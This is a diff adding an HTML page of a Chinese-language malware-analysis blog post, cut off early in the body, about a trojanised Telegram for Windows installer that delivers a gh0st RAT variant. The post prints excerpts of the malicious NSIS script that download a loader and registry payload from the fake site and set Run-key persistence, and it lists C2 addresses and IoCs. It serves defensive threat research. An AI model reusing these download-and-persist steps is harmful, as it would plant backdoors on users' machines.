@@ -1,0 +1,1009 @@
+
+<!DOCTYPE html>
+<html lang="en">
+    
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="&lt;Theo/&gt;">
+    <title>分析一個加料的 Telegram for Windows 中文版安裝程式 - &lt;Theo/&gt;</title>
+    <meta name="author" content="Theo Chen">
+    
+        <meta name="keywords" content="Telegram,Trojan,gh0st RAT,Malware">
+    
+    
+        <link rel="icon" href="https://blog.theo.com.tw/assets/images/favicon.ico">
+    
+    
+        
+            <link rel="alternate" type="application/rss+xml" title="RSS" href="/rss2.xml">
+        
+    
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Theo Chen","sameAs":["https://github.com/TheoKlein","https://twitter.com/The0_Klein","https://www.linkedin.com/in/theo-chen/","mailto:theokleintw@gmail.com"],"image":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176"},"articleBody":"紀錄一下分析一個被重新打包加料過的中文版 Telegram 安裝程式的過程和發現的東西。\n\n\n\n\n\n最初的樣本來自 http://telegram-vip[.]com，一個中文版 Telegram 的介紹和下載網站。\nFigure 1. 假的中文版 Telegram 網站\n\n網站首頁就有各版本的下載連結，但其中首頁下載 Telegram for Mac 和 Telegram for windows 的連結都會是下載被加料過的 Windows 安裝程式（寫這篇文章的時候下載的檔案是 tsetup.2.1.10.exe）。點選 Android 或 iPhone 的版本會到另一個下載的頁面：\nFigure 2. 下載頁面\n這邊就有些不同了：\n\niPhone 下載的連結會連回到正常的 Apple App Store https://apps.apple.com/app/telegram-messenger/id686449807\nAndroid 版本會到另一個連結下載檔案 https://telegrcn.org/download/telegramCN_631.apk\nMac 版本會到另一個連結下載檔案 https://telegrcn.org/download/tsetup.2.1.10.dmg\nWindows 版本跟首頁下載的檔案一樣\n\n接下來這篇文章會只針對 Windows 的版本敘述，這個假的網站在今年 9 月時就已經在 Twitter 上有相關的討論，Android 版本的 APK 也已知是假的 APP，我在快分析完了才查到這個資料 😢，再次學到教訓把頭埋進逆向之前還是要好好的把訊息蒐集跟調查做好。\n\nInteresting, signed, low detected &quot;telegram_setup.2.1.6.exe&quot;: 8c957cfced1bcf7803f810d6ae5a6d13cce005637be3ed40a311793419cd92c1From: http://telegram-vip[.]com/telegram_setup.2.1.6.exeSeems some Chinese speaker made malware, targeting Chinese people.🤔cc @JAMESWT_MHT @cyb3rops pic.twitter.com/5jAtnQCkjx&mdash; MalwareHunterTeam (@malwrhunterteam) September 28, 2020 \n\n\n不過雖然已經有討論串出現，但現在看到的版本已經來到了 2.1.10，這讓我好奇想要來比較一下跟九月時的 2.1.6 版本有了什麼變化。接下來會用我手上有的 telegram_setup.2.1.10.exe 跟我在 ANY.RUN 這個分析找到的 telegram_setup.2.1.6.exe 相關檔案來做比較。\n重新打包加料過的安裝程式\n\n\nFilename\nSHA256\n\n\n\ntelegram_setup.2.1.6.exe\n1f09381186a82f070d7beda66f575efdecd92b76217b5a0d9b904c1d64c89fc8\n\n\ntelegram_setup.2.1.10.exe\n35133a3283381aa503f0d415de3ab8111e2e690bd32ad3dddde1213b51c877ba\n\n\n這兩個安裝程式都是用 NSIS (nullsoft scriptable install system) 打包的，可以利用 7-zip 直接解壓縮就能得到還原的安裝腳本 [NSIS].nsi。7-zip 在 9.33 的版本加入了自動反編譯 NSIS 腳本的功能，但又在 15.06 把這個功能拿掉了，所以要注意 7-zip 版本必須介於這兩者之間。\n解開以後兩個版本的目錄結構如下：\n123456789101112131415162.1.6/├── $PLUGINSDIR                        // NSIS 相關的檔案│   ├── InstallOptions.dll│   ├── ioSpecial.ini│   ├── LangDLL.dll│   ├── modern-wizard.bmp│   └── TextReplace.dll├── C                                  // 安裝過程中會直接複製到對應的位置的檔案│   └── PerfLog│       ├── AddInProcess.exe           // Backdoor (Loader)│       └── AddInProcess.exe.config├── [NSIS].nsi                         // 7-zip 解出來的 NSIS 腳本├── ns.reg                             // Payload Registry File├── Telegram.exe                       // Telegram Desktop 2.1.6.0├── uninst.exe.nsis└── Updater.exe\n123456789101112132.1.10/├── $PLUGINSDIR                        // NSIS 相關的檔案│   ├── InetLoad.dll│   ├── InstallOptions.dll│   ├── ioSpecial.ini│   ├── LangDLL.dll│   ├── modern-wizard.bmp│   ├── System.dll│   └── TextReplace.dll├── [NSIS].nsi                         // 7-zip 解出來的 NSIS 腳本├── Telegram.exe                       // Telegram Desktop 2.1.6.0├── uninst.exe.nsis└── Updater.exe\n\n對比兩個版本可以很明顯的注意到 2.1.10 少了 C:\\PerfLog 跟 ns.reg 關鍵的後門檔案，2.1.6 很直接的就把這些檔案一起打包，2.1.10 改變方式，利用 NSIS 腳本在安裝過程中才將這兩個檔案下載下來，這可以在 [NSIS].nis 腳本中看到，下面是從 2.1.10 的 [NSIS].nsi 腳本中節錄部份相關的指令：\n123# Download loader and registry fileInetLoad::load /BANNER &quot;&quot; &quot;Cameron Diaz download in progress, please wait ;)&quot; http://www.telegram-vip.com/index2.php cnPath.exeInetLoad::load /BANNER &quot;&quot; &quot;Cameron Diaz download in progress, please wait ;)&quot; http://www.telegram-vip.com/index3.php ns.reg\n12345# Replace 123456 to &lt;ComputerName&gt; from ns.reg then use regedit.exe to importReadRegStr $R1 HKLM SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName ComputerNameTextReplace::_FindInFile /NOUNLOAD $INSTDIR\\ns.reg 123456 /S=1TextReplace::_ReplaceInFile /NOUNLOAD $INSTDIR\\ns.reg $INSTDIR\\ns.reg 123456 $R1 &quot;/S=1 /C=1 /AO=1&quot;Exec &quot;regedit.exe /s $\\&quot;$INSTDIR\\ns.reg$\\&quot;&quot;\n1234# Move $INSTDIR\\cnPath.exe to C:\\PerfLog\\AddInProcess.exeStrCpy $R0 $INSTDIR\\cnPath.exeStrCpy $R1 C:\\PerfLog\\AddInProcess.exeSystem::Call &quot;Kernel32::MoveFileA(t R0,t R1)&quot;\n123# Setup service registry and runWriteRegStr HKCU Software\\Microsoft\\Windows\\CurrentVersion\\Run telegramCnService C:\\PerfLog\\AddInProcess.exeExecShell &quot;&quot; C:\\PerfLog\\AddInProcess.exe\n基本上看完 NSIS 腳本就能了解它的感染手段跟持久化的方式。\n載入器 AddInProcess.exe知道安裝過程動的手腳以後，目標就很明確了，AddInProcess.exe 跟寫入的 Registry 資料。\n\n\n\nFilename\nSHA256\n\n\n\nAddInProcess.exe (2.1.6)\nf853c478fc57ac7e8bf3676b5d043d8bf071e2b817fe93d2acbd0333c46d1063\n\n\nAddInProcess.exe (2.1.10)\n379a9fcb8701754559901029812e6614c187d114e3527dd41795aa7647b68811\n\n\n基本上兩個的函式內容並沒有不同，僅有 metadata 改變而已，File Version 從 1.0.0.0 變成 1.3.0.0。\nFigure 3. 兩者的檔案基本訊息\nFigure 4. 相同的 .NET 函式結構\nFigure 5. 相同的 Main 函式\n\n從 Figure 5. 的 Main 函式就可以知道，AddInProcess.exe 只是個載入器，真正的內容在安裝時匯入的 registry 資料裡，位在 HKEY_CURRENT_USER\\Software\\&lt;COMPUTERNAME&gt;裡面是 base64 編碼過的 DLL 和一個 ip 位址。\nFigure 6. Registry 的內容\n\nAssembly.Load(Malware.dll)藉助 .NET 的 Assembly.Load 函式可以動態載入另一個 .NET 的 DLL，也就是 registry 的內容，我們可以提取出來進一步分析。\n\n\n\nFilename\nCompile Time\nSHA256\n\n\n\nns.reg (2.1.6)\nN&#x2F;A\n96e0c3048df12fd8a930fbf38e380e229b4cdb8c2327c58ad278cfb7dafcec22\n\n\nregistry.bin (2.1.6)\n2020-09-23T09:43:39\n7fd9d7a91eb9f413463c9f358312fce6a6427b3cd4f5e896a4a5629cb945520a\n\n\nns.reg (2.1.10)\nN&#x2F;A\nd620d8f93877387b7fab7828bbfe44f38f4a738ca6fd68f18507b3aa95da683a\n\n\nregistry.bin (2.1.10)\n2020-09-28T18:16:01\ne60b984b7515a6d606ee4e4ae9cb7936bc403176e0ac8dbeeb6d0ae201fca3ef\n\n\n\n\n\nPDB Path\n\n\n\nD:\\source\\MyJob\\反射dll\\ConsoleApplication2\\obj\\Release\\反射.pdb\n\n\n\n這兩個 ns.reg 都維持 “123456” 並未被修改成 computer name 前的狀態。\n\n提取出來的 .NET DLL 擁有相同的函式。\nFigure 7. registry.bin 的函式\n\n其中僅有 Main 函式，和寫死在 ClassBuff 其中的 dlldata 有差異。\nFigure 8. registry.bin (2.1.6) 的 Main 函式\nFigure 9. registry.bin (2.1.10) 的 Main 函式\n\n在 2.1.6 的版本中，C2 的 ip 位址是用 Program.GetRegedit() 從 registry 裡面讀出來的，不知道為什麼在 2.1.10 的版本中變成帶入寫死的 base64 字串 MTU0LjIyMi4xMDMuNTg6Nzg3OA== 到 Program.StartWorkThread()。\nFigure 10. registry.bin 的 StartWorkThread 函式\n\nProgram.StartWorkThread() 負責將 C2 的 ip 位址和 port 準備好來接著啟動 Program.MainThread()。這裡比較特別的是這個函式有另一個預設的 C2 ip 位址，當函數被呼叫代入空字串時，便會使用這個 ip。綜合前面看到 Main() 函式裡有個迴圈，在等待 300 秒後便會呼叫 Program.StartWorkThread(&quot;&quot;)，這時便會使用這個 ip 位址。\nFigure 11. registry.bin 的 MainThread 函式\n\nProgram.MainThread() 接著將包含 ip 位址的物件轉為 bytes 後，尋找 ClassBuff().dlldata 裡預設的 255.255.255.255 來覆蓋掉。最後使用 DLLFromMemory 這個 class 在記憶體中直接執行最終的 DLL，export function Launch。\nHello gh0st RAT DLL\n\n\nFilename\nCompile Time\nSHA256\n\n\n\ndlldata_2.1.6.bin\n2020-09-23T06:17:16\ne0d7398d2a5a936584742bd456ab2788722a989ad5e9c49567207c76275254b0\n\n\ndlldata_2.1.10.bin\n2020-09-28T18:15:16\n9c0aa1e136f02e99b80e27e48dc5c4bb95a0b7f115d2f68aa4e9b1bef593d3db\n\n\n\n\n\nPDB Path\n\n\n\nD:\\source\\MyJob\\企业远程控制\\Release\\ServerDll.pdb\n\n\n\n這兩個 DLL 都維持 C2 ip 是 255.255.255.255，還沒被修改前寫死在 registry.bin 的原樣。\n\n最後在記憶體中動態載入的 DLL 是 gh0st RAT 的變種，新舊版本兩者的相似度極高，功能上大致沒有差異。\nFigure 12. dlldata_2.1.6.bin 和 dlldata_2.1.10.bin BinDiff 的比較結果\n\n關於 gh0st RAT 的已經有很多很詳細的報告跟原始碼可以閱讀，這邊就不細講最後的這個 DLL。比較值得提的是這個樣本傳送和接收 TCP 封包都有進行簡單的位元運算。\nFigure 13. 收到封包後的編碼動作\nFigure 14. 送出封包前的編碼動作\n\n另外這個 gh0st RAT 變種的 magic header 僅有三個字： 203 (\\x32\\x30\\x33)，編碼後是 \\xCD\\xCF\\xCE，後面 4 個 bytes 一樣是封包的大小（Figure 15. 的橘色框 \\x0F\\x03\\x00\\x00），剩餘資料並未壓縮。\nFigure 15. 原始的封包特徵\n\n延伸調查以上，關於惡意程式的部份已經瞭解的差不多了，接下來把目光放回到 C2 上面。\n前面分析的過程中得到了這兩個 C2 位址：\n\n154.222.103.58:7878\n第一個 C2 ip，2.1.6 版本是從 registry 讀出來，到了 2.1.10 雖然 registry 裡仍然有一樣的 ip，但樣本內也同時寫死了一樣的 ip（參考 Figure 9.）\n\n\n185.224.168.130:3563\n第二個 C2 ip，等待五分鐘後才連線用的（參考 Figure 10.）\n\n\n\n還有最初的假網站 http://telegram-vip.com， A record 是 45.114.106.2。通過 favicon hash 或 HTML body hash 可以找到總共有五個關聯的 ip 都部屬著一樣的假網站：\n\n45.114.106.2\n45.114.106.3\n45.114.106.4\n45.114.106.5\n45.114.106.6\n\n相關的搜尋特徵：https://www.shodan.io/search?query=http.favicon.hash%3A1246367191+country%3A%22CN%22https://censys.io/ipv4?q=f66e0b7ec3a87e950ae989e1825174b43ccd4b56c32963e5c475bead44adf700\nFigure 16. Shodan 針對 favicon hash 的搜尋結果\n\nFigure 17. Censys 針對 HTTP body hash 的搜尋結果\n\n其中 45.114.106.3 有一個 Domain Name telegramsvip.com，看了一下 whois 是 10&#x2F;15 才建的\n1234567891011121314151617181920Domain Name: TELEGRAMSVIP.COMRegistry Domain ID: 2565966013_DOMAIN_COM-VRSNRegistrar WHOIS Server: whois.godaddy.comRegistrar URL: http://www.godaddy.comUpdated Date: 2020-10-15T08:01:06ZCreation Date: 2020-10-15T08:01:05ZRegistry Expiry Date: 2021-10-15T08:01:05ZRegistrar: GoDaddy.com, LLCRegistrar IANA ID: 146Registrar Abuse Contact Email: abuse(|]godaddy.comRegistrar Abuse Contact Phone: 480-624-2505Domain Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibitedDomain Status: clientRenewProhibited https://icann.org/epp#clientRenewProhibitedDomain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibitedDomain Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibitedName Server: NS35.DOMAINCONTROL.COMName Server: NS36.DOMAINCONTROL.COMDNSSEC: unsignedURL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/&gt;&gt;&gt; Last update of whois database: 2020-10-25T15:39:21Z\n\n甚至還打了 Google 廣告 XD\nFigure 18. Google 搜尋廣告\n\n相較原先的 telegram-vip.com 是在 09&#x2F;21 就建立了，就在編譯後門的前兩天。\n1234567891011121314151617Domain Name: TELEGRAM-VIP.COMRegistry Domain ID: 2561073458_DOMAIN_COM-VRSNRegistrar WHOIS Server: whois.godaddy.comRegistrar URL: http://www.godaddy.comUpdated Date: 2020-10-15T08:03:30ZCreation Date: 2020-09-21T06:44:59ZRegistry Expiry Date: 2021-09-21T06:44:59ZRegistrar: GoDaddy.com, LLCRegistrar IANA ID: 146Registrar Abuse Contact Email: abuse(aT&#125;godaddy.comRegistrar Abuse Contact Phone: 480-624-2505Domain Status: ok https://icann.org/epp#okName Server: NS13.DOMAINCONTROL.COMName Server: NS14.DOMAINCONTROL.COMDNSSEC: unsignedURL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/&gt;&gt;&gt; Last update of whois database: 2020-10-25T15:40:38Z\n\n小結以上便是針對 Windows installer 的部份在分析過程中發現的一些有趣的內容，這個詐騙網站現在還在持續運作中，或許未來還能看到攻擊者對樣本有所更新，再觀察看看。（或是有空也來分析一下那個假的 APK）\nIoCs\n\n\nIP\nDescription\n\n\n\n45.114.106.2\nFake Site\n\n\n45.114.106.3\nFake Site\n\n\n45.114.106.4\nFake Site\n\n\n45.114.106.5\nFake Site\n\n\n45.114.106.6\nFake Site\n\n\n154.222.103.58\ngh0st RAT C2\n\n\n185.224.168.130\ngh0st RAT C2\n\n\n\n\n\nDomain\nCreation Date\n\n\n\ntelegram-vip.com\n2020-09-21T06:44:59Z\n\n\ntelegramsvip.com\n2020-10-15T08:01:05Z\n\n\ntelegrcn.org\n2020-05-19T02:31:56Z\n\n\n\n\n\nSHA256\nDescription\n\n\n\n1f09381186a82f070d7beda66f575efdecd92b76217b5a0d9b904c1d64c89fc8\ntelegram_setup.2.1.6.exe\n\n\n35133a3283381aa503f0d415de3ab8111e2e690bd32ad3dddde1213b51c877ba\ntsetup.2.1.10.exe\n\n\nf853c478fc57ac7e8bf3676b5d043d8bf071e2b817fe93d2acbd0333c46d1063\nAddInProcess.exe (telegram_setup.2.1.6.exe)\n\n\n379a9fcb8701754559901029812e6614c187d114e3527dd41795aa7647b68811\nAddInProcess.exe (tsetup.2.1.10.exe)\n\n\n96e0c3048df12fd8a930fbf38e380e229b4cdb8c2327c58ad278cfb7dafcec22\nns.reg (2.1.6)\n\n\nd620d8f93877387b7fab7828bbfe44f38f4a738ca6fd68f18507b3aa95da683a\nns.reg (2.1.10)\n\n\n7fd9d7a91eb9f413463c9f358312fce6a6427b3cd4f5e896a4a5629cb945520a\nexcracted DLL from ns.reg (2.1.6)\n\n\ne60b984b7515a6d606ee4e4ae9cb7936bc403176e0ac8dbeeb6d0ae201fca3ef\nextracted DLL from ns.reg (2.1.10)\n\n\ne0d7398d2a5a936584742bd456ab2788722a989ad5e9c49567207c76275254b0\nembedded gh0st RAT DLL (2.1.6)\n\n\n9c0aa1e136f02e99b80e27e48dc5c4bb95a0b7f115d2f68aa4e9b1bef593d3db\nembedded gh0st RAT DLL (2.1.10)\n\n\n19d1ff6bb589fab200f3bced0f148bb5e20fe9b37bd03de9cd425116cc0dba17\ntelegramCN_631.apk\n\n\n\n\n\nPDB Path\n\n\n\nD:\\source\\MyJob\\反射dll\\ConsoleApplication2\\obj\\Release\\反射.pdb\n\n\nD:\\source\\MyJob\\企业远程控制\\Release\\ServerDll.pdb\n\n\n","dateCreated":"2020-10-25T17:01:39+00:00","dateModified":"2025-01-17T13:11:17+00:00","datePublished":"2020-10-25T17:01:39+00:00","description":"紀錄一下分析一個被重新打包加料過的中文版 Telegram 安裝程式的過程和發現的東西。","headline":"分析一個加料的 Telegram for Windows 中文版安裝程式","image":["thumb-min.jpg","cover-min.jpg"],"mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.theo.com.tw/Research/%E5%88%86%E6%9E%90%E4%B8%80%E5%80%8B%E5%8A%A0%E6%96%99%E7%9A%84-Telegram-for-Windows-%E4%B8%AD%E6%96%87%E7%89%88%E5%AE%89%E8%A3%9D%E7%A8%8B%E5%BC%8F/"},"publisher":{"@type":"Organization","name":"Theo Chen","sameAs":["https://github.com/TheoKlein","https://twitter.com/The0_Klein","https://www.linkedin.com/in/theo-chen/","mailto:theokleintw@gmail.com"],"image":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176","logo":{"@type":"ImageObject","url":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176"}},"url":"https://blog.theo.com.tw/Research/%E5%88%86%E6%9E%90%E4%B8%80%E5%80%8B%E5%8A%A0%E6%96%99%E7%9A%84-Telegram-for-Windows-%E4%B8%AD%E6%96%87%E7%89%88%E5%AE%89%E8%A3%9D%E7%A8%8B%E5%BC%8F/","keywords":"Malware, Telegram, Trojan, gh0st RAT","thumbnailUrl":"thumb-min.jpg"}</script>
+    
+    <meta name="description" content="紀錄一下分析一個被重新打包加料過的中文版 Telegram 安裝程式的過程和發現的東西。">
+<meta property="og:type" content="blog">
+<meta property="og:title" content="分析一個加料的 Telegram for Windows 中文版安裝程式">
+<meta property="og:url" content="https://blog.theo.com.tw/Research/%E5%88%86%E6%9E%90%E4%B8%80%E5%80%8B%E5%8A%A0%E6%96%99%E7%9A%84-Telegram-for-Windows-%E4%B8%AD%E6%96%87%E7%89%88%E5%AE%89%E8%A3%9D%E7%A8%8B%E5%BC%8F/index.html">
+<meta property="og:site_name" content="&lt;Theo&#x2F;&gt;">
+<meta property="og:description" content="紀錄一下分析一個被重新打包加料過的中文版 Telegram 安裝程式的過程和發現的東西。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog.theo.com.tw/Research/%E5%88%86%E6%9E%90%E4%B8%80%E5%80%8B%E5%8A%A0%E6%96%99%E7%9A%84-Telegram-for-Windows-%E4%B8%AD%E6%96%87%E7%89%88%E5%AE%89%E8%A3%9D%E7%A8%8B%E5%BC%8F/cover-min.jpg">
+<meta property="article:published_time" content="2020-10-25T17:01:39.000Z">
+<meta property="article:modified_time" content="2025-01-17T13:11:17.282Z">
+<meta property="article:author" content="Theo Chen">
+<meta property="article:tag" content="Malware">
+<meta property="article:tag" content="Telegram">
+<meta property="article:tag" content="Trojan">
+<meta property="article:tag" content="gh0st RAT">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.theo.com.tw/Research/%E5%88%86%E6%9E%90%E4%B8%80%E5%80%8B%E5%8A%A0%E6%96%99%E7%9A%84-Telegram-for-Windows-%E4%B8%AD%E6%96%87%E7%89%88%E5%AE%89%E8%A3%9D%E7%A8%8B%E5%BC%8F/cover-min.jpg">
+<meta name="twitter:creator" content="@The0_Klein">
+    
+    
+        
+    
+    
+    
+        <meta property="og:image" content="https://blog.theo.com.tw/Research/%E5%88%86%E6%9E%90%E4%B8%80%E5%80%8B%E5%8A%A0%E6%96%99%E7%9A%84-Telegram-for-Windows-%E4%B8%AD%E6%96%87%E7%89%88%E5%AE%89%E8%A3%9D%E7%A8%8B%E5%BC%8F/thumb-min.jpg"/>
+        <meta class="swiftype" name="image" data-type="enum" content="https://blog.theo.com.tw/Research/%E5%88%86%E6%9E%90%E4%B8%80%E5%80%8B%E5%8A%A0%E6%96%99%E7%9A%84-Telegram-for-Windows-%E4%B8%AD%E6%96%87%E7%89%88%E5%AE%89%E8%A3%9D%E7%A8%8B%E5%BC%8F/thumb-min.jpg"/>
+    
+    
+        <meta property="og:image" content="https://blog.theo.com.tw/Research/%E5%88%86%E6%9E%90%E4%B8%80%E5%80%8B%E5%8A%A0%E6%96%99%E7%9A%84-Telegram-for-Windows-%E4%B8%AD%E6%96%87%E7%89%88%E5%AE%89%E8%A3%9D%E7%A8%8B%E5%BC%8F/cover-min.jpg"/>
+        <meta class="swiftype" name="image" data-type="enum" content="https://blog.theo.com.tw/Research/%E5%88%86%E6%9E%90%E4%B8%80%E5%80%8B%E5%8A%A0%E6%96%99%E7%9A%84-Telegram-for-Windows-%E4%B8%AD%E6%96%87%E7%89%88%E5%AE%89%E8%A3%9D%E7%A8%8B%E5%BC%8F/cover-min.jpg"/>
+    
+    
+    <!--STYLES-->
+    
+<link rel="stylesheet" href="/assets/css/style-gdcyhoyuzwa8smbm8vz2yfxz7vo2renh92pv061urgkby5doa9lemz924ywr.min.css">
+
+    <!--STYLES END-->
+    
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-106120242-2"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'UA-106120242-2');
+    </script>
+
+
+    
+
+    
+        
+    
+</head>
+
+    <body>
+        <div id="blog">
+            <!-- Define author's picture -->
+
+
+    
+        
+    
+
+<header id="header" data-behavior="2">
+    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+    <div class="header-title">
+        <a
+            class="header-title-link"
+            href="/"
+            aria-label=""
+        >
+            &lt;Theo/&gt;
+        </a>
+    </div>
+    
+        
+            <a
+                class="header-right-picture "
+                href="#about"
+                aria-label="Open the link: /#about"
+            >
+        
+        
+            <img class="header-picture" src="https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176?s=90" alt="Author&#39;s picture"/>
+        
+        </a>
+    
+</header>
+
+            <!-- Define author's picture -->
+
+
+    
+
+<nav id="sidebar" data-behavior="2">
+    <div class="sidebar-container">
+        
+            <div class="sidebar-profile">
+                <a
+                    href="/#about"
+                    aria-label="Read more about the author"
+                >
+                    <img class="sidebar-profile-picture" src="https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176?s=110" alt="Author&#39;s picture"/>
+                </a>
+                <h4 class="sidebar-profile-name">Theo Chen</h4>
+                
+                    <h5 class="sidebar-profile-bio"><p>Penetration Testing &#x2F; Malware Analysis &#x2F; Threat Hunting &#x2F; APT Research<br /><br />Ingress Enlightened Agent</p>
+</h5>
+                
+            </div>
+        
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/"
+                            
+                            rel="noopener"
+                            title="Home"
+                        >
+                        <i class="sidebar-button-icon fa fa-home" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Home</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-categories"
+                            
+                            rel="noopener"
+                            title="Categories"
+                        >
+                        <i class="sidebar-button-icon fa fa-bookmark" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Categories</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-tags"
+                            
+                            rel="noopener"
+                            title="Tags"
+                        >
+                        <i class="sidebar-button-icon fa fa-tags" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Tags</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-archives"
+                            
+                            rel="noopener"
+                            title="Archives"
+                        >
+                        <i class="sidebar-button-icon fa fa-archive" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Archives</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="#about"
+                            
+                            rel="noopener"
+                            title="About"
+                        >
+                        <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">About</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://github.com/TheoKlein"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="GitHub"
+                        >
+                        <i class="sidebar-button-icon fab fa-github" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">GitHub</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://twitter.com/The0_Klein"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="Twitter"
+                        >
+                        <i class="sidebar-button-icon fab fa-twitter" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Twitter</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://www.linkedin.com/in/theo-chen/"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="LinkedIn"
+                        >
+                        <i class="sidebar-button-icon fab fa-linkedin" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">LinkedIn</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="mailto:theokleintw@gmail.com"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="Mail"
+                        >
+                        <i class="sidebar-button-icon fa fa-envelope" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Mail</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/rss2.xml"
+                            
+                            rel="noopener"
+                            title="RSS"
+                        >
+                        <i class="sidebar-button-icon fa fa-rss" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">RSS</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+    </div>
+</nav>
+
+            
+        <div class="post-header-cover
+                    text-center
+                    "
+             style="background-image:url('/Research/%E5%88%86%E6%9E%90%E4%B8%80%E5%80%8B%E5%8A%A0%E6%96%99%E7%9A%84-Telegram-for-Windows-%E4%B8%AD%E6%96%87%E7%89%88%E5%AE%89%E8%A3%9D%E7%A8%8B%E5%BC%8F/cover-min.jpg');"
+             data-behavior="2">
+            
+        </div>
+
+            <div id="main" data-behavior="2"
+                 class="hasCover
+                        hasCoverMetaOut
+                        ">
+                
+<article class="post">
+    
+    
+        <div class="post-header main-content-wrap text-center">
+    
+        <h1 class="post-title">
+            分析一個加料的 Telegram for Windows 中文版安裝程式
+        </h1>
+    
+    
+        <div class="post-meta">
+    <time datetime="2020-10-25T17:01:39+00:00">
+	
+		    Oct 25, 2020
+    	
+    </time>
+    
+        <span>in </span>
+        
+    <a class="category-link" href="/categories/Research/">Research</a>
+
+
+    
+</div>
+
+    
+</div>
+
+    
+    <div class="post-content markdown">
+        <div class="main-content-wrap">
+            <p>紀錄一下分析一個被重新打包加料過的中文版 Telegram 安裝程式的過程和發現的東西。</p>
+<span id="more"></span>
+
+<h1 id="table-of-contents">Table of Contents</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%87%8D%E6%96%B0%E6%89%93%E5%8C%85%E5%8A%A0%E6%96%99%E9%81%8E%E7%9A%84%E5%AE%89%E8%A3%9D%E7%A8%8B%E5%BC%8F"><span class="toc-text">重新打包加料過的安裝程式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BC%89%E5%85%A5%E5%99%A8-AddInProcess-exe"><span class="toc-text">載入器 AddInProcess.exe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Assembly-Load-Malware-dll"><span class="toc-text">Assembly.Load(Malware.dll)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hello-gh0st-RAT-DLL"><span class="toc-text">Hello gh0st RAT DLL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BB%B6%E4%BC%B8%E8%AA%BF%E6%9F%A5"><span class="toc-text">延伸調查</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%B5%90"><span class="toc-text">小結</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IoCs"><span class="toc-text">IoCs</span></a></li></ol>
+
+<hr>
+<p>最初的樣本來自 <code>http://telegram-vip[.]com</code>，一個中文版 Telegram 的介紹和下載網站。</p>
+<div class="figure center" style="width:;"><a class="fancybox" href="p1.png" title="Figure 1. 假的中文版 Telegram 網站" data-caption="Figure 1. 假的中文版 Telegram 網站" data-fancybox="default"><img class="fig-img" src="p1.png" alt="Figure 1. 假的中文版 Telegram 網站"></a><span class="caption">Figure 1. 假的中文版 Telegram 網站</span></div>
+
